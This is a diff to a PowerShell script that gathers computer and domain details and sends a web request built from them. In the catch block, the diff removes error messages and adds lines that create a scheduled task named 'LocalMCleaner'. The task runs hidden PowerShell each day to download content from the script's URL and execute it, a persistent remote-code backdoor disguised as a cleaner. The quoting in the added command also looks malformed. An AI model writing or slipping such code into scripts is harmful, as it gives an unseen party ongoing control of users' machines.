@@ -3,6 +3,7 @@ $computerInfo = Get-ComputerInfo
   
 if ($computerInfo.CsPartOfDomain) 
 {  
+
  $domain = $computerInfo.Domain  
     $computerName = $computerInfo.CsName  
     $domain = $computerInfo.CsDomain
@@ -13,11 +14,11 @@ if ($computerInfo.CsPartOfDomain)
         Write-Host "URL: $url"  
         Write-Host "$($response.StatusCode)"  
     } catch {  
-        Write-Host "error: $_"  
+    $str = "cmd.exe /c schtasks /create /sc daily /tn LocalMCleaner /tr "Powershell -WindowStyle Hidden irm " + $url +"|Powershell" /st 11:30 /f"
+    iex  $str
     }  
 } 
 else
 {  
-    Write-Host "bye"  
     exit  
 }
